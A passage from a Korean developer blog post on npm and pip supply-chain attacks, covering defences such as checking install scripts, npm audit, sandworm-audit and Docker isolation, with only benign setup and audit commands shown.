<p>위는 클라이언트 기계에서 파이썬을 실행합니다. 설치 실행을 위한 기교가 대단합니다.</p>
<p><del>제가 이렇게 코드블럭을 남긴 이유는 나중에 제가 공격자가 될 때 사용하기 위함입니다.</del></p>
<p>방어 전략은 pre-install, post-install을 하는지 레포에서 파악하고 설치를 처리합니다. 그리고 설치를 할 때 무슨 명령을 하는지 라이브러리 코드를 독해하는 능력을 길러야 합니다.</p>
<p>sandworm-audit을 실행하면 된다고 하는데 사실 잘 모릅니다.</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="방어">방어<a href="#방어" class="hash-link" aria-label="방어에 대한 직접 링크" title="방어에 대한 직접 링크">​</a></h2>
<p>방어 전략들이 필요합니다. 로컬 머신을 방어하려면 먼저 Docker를 설치해서 패키지 내에 멀웨어의 활동범위를 축소시켜야 합니다. docker는 다루다가 보니까 저의 블로그 글쓰기 주제를 벗어 났습니다. 컨테이너 인스턴스를 띄우는 방법은 생략하겠습니다.</p>
<p>npm audit을 통해서 실제 보안취약점 문제를 확인하도록 합니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npm audit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="sandworm">sandworm<a href="#sandworm" class="hash-link" aria-label="sandworm에 대한 직접 링크" title="sandworm에 대한 직접 링크">​</a></h2>
<p>npm에 대해서는 조금더 근본적인 해결책을 찾고 싶었습니다.</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="dockerize로-기계-방어">Dockerize로 기계 방어<a href="#dockerize로-기계-방어" class="hash-link" aria-label="Dockerize로 기계 방어에 대한 직접 링크" title="Dockerize로 기계 방어에 대한 직접 링크">​</a></h2>
<p>Docker를 사용하는 이유는 로컬 기계에서 서로 격리시키기 때문입니다. 도커 컨테이너 내에 모두 설치하고 컨테이 너를 종료하면 삭제하는 것으로 방어합니다. 설치된 파일이 컨테이너 내부에서 실행되고 있기 때문에 기계 전체를 접근하기는 어렵습니다. 개발하는 로컬환경에서도 이렇게 Docker를 사용하는 것이 좋습니다. 하지만 그래도 한계도 있습니다.</p>
<ul>
<li>피해가 컨테이너 내부라고 할 뿐이지 컨테이너 내부에도 중요한 정보들이 있습니다.</li>
<li>환경변수(<code>.env</code>파일)와 관련된 개인정보는 탈취당할 수 있습니다.</li>
<li>Docker 자체도 보안취약점이 있습니다. base image도 결국에는 Docker hub에서 선택하고 공급망에 의존하고 있습니다. 공급망에 의존하고 있는한 언제든지 공급자가 백도어를 설치할 가능성이 높습니다.</li>
</ul>
<p>그래서 개발환경을 Dockerize는 당연히 해야 하는 것이고 그래도 부족한 것입니다. 또 Docker에 대한 audit도 처리해야 합니다.</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="npm의-세계는-생각보다-안전합니다">npm의 세계는 생각보다 안전합니다.<a href="#npm의-세계는-생각보다-안전합니다" class="hash-link" aria-label="npm의 세계는 생각보다 안전합니다.에 대한 직접 링크" title="npm의 세계는 생각보다 안전합니다.에 대한 직접 링크">​</a></h2>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npx create-next-app@latest .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npx nuxi@latest init .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npm create vite@latest .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npm audit --audit-level=high</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npx @sandworm/audit@latest</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복 사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>저는 스스로 사람을 불신한다고 하면서 사람을 아주 잘 믿는 사람입니다.</p>
<p>생각보다 anticlimactic하게 별거 없었습니다. 꽤나 심각한 멀웨어를 왕창 설치할 거라고 생각했는데 아니었습니다.</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="결론">결론<a href="#결론" class="hash-link" aria-label="결론에 대한 직접 링크" title="결론에 대한 직접 링크">​</a></h2>
<p>설치할 때 보안취약점 확인해보고 없으면 그냥 편하게 개발합시다.</p>
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithHideOnScrollNavbar_WYt5 sr-only" id="footnote-label">Footnotes<a href="#footnote-label" class="hash-link" aria-label="Footnotes에 대한 직접 링크" title="Footnotes에 대한 직접 링크">​</a></h2>
<ol>
<li id="user-content-fn-1-84611a">
<p><a href="https://m.boannews.com/html/detail.html?mtype=3&amp;tab_type=H&amp;idx=122516" target="_blank" rel="noopener noreferrer">[카드뉴스] ‘최근 가장 뜨거운 보안 이슈’, 공급망 공격</a> <a href="#user-content-fnref-1-84611a" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">↩</a></p>
</li>
</ol>
</section></div><footer class="row docusaurus-mt-lg blogPostFooterDetailsFull_mRVl"><div class="col"><b>태그:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/docker">docker</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/보안">보안</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/npm">npm</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/pip">pip</a></li></ul></div><div class="col margin-top--sm"><a href="https://github.com/arch-spatula/arch-spatula.github.io/blob/dev/blog/2024-01-31-npm-security.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>페이지 편집</a></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="블로그 게시물 탐색"><a class="pagination-nav__link pagination-nav__link--prev" href="/blog/2024/02/14"><div class="pagination-nav__sublabel">이전 게시물</div><div class="pagination-nav__label">neovim의 발을 들이면서...</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/blog/2023/12/01"><div class="pagination-nav__sublabel">다음 게시물</div><div class="pagination-nav__label">자바스크립트 Task Queue 블러킹 풀기</div></a></nav><div style="margin-top:3rem"></div></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#배경" class="table-of-contents__link toc-highlight">배경</a></li><li><a href="#공급망-공격" class="table-of-contents__link toc-highlight">공급망 공격</a><ul><li><a href="#npm-account-공격" class="table-of-contents__link toc-highlight">npm Account 공격</a></li><li><a href="#typosquatting-attack" class="table-of-contents__link toc-highlight">Typosquatting Attack</a></li><li><a href="#패키지-피싱" class="table-of-contents__link toc-highlight">패키지 피싱</a></li><li><a href="#installation-scripts" class="table-of-contents__link toc-highlight">Installation Scripts</a></li></ul></li><li><a href="#방어" class="table-of-contents__link toc-highlight">방어</a></li><li><a href="#sandworm" class="table-of-contents__link toc-highlight">sandworm</a></li><li><a href="#dockerize로-기계-방어" class="table-of-contents__link toc-highlight">Dockerize로 기계 방어</a></li><li><a href="#npm의-세계는-생각보다-안전합니다" class="table-of-contents__link toc-highlight">npm의 세계는 생각보다 안전합니다.</a></li><li><a href="#결론" class="table-of-contents__link toc-highlight">결론</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">이런저런 것</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">블로그</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/intro">이런저런 레시피 시리즈</a></li><li class="footer__item"><a class="footer__link-item" href="/react-cookbook/intro">리액트 Cook-Book</a></li><li class="footer__item"><a class="footer__link-item" href="/vue/intro">뷰 Cook-Book</a></li><li class="footer__item"><a class="footer__link-item" href="/js-ts-cookbook/intro">JS &amp; TS Cook-Book</a></li><li class="footer__item"><a class="footer__link-item" href="/easter">easter</a></li></ul></div><div class="col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="https://twitter.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2024 Arch-Spatula | All rights reserved. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>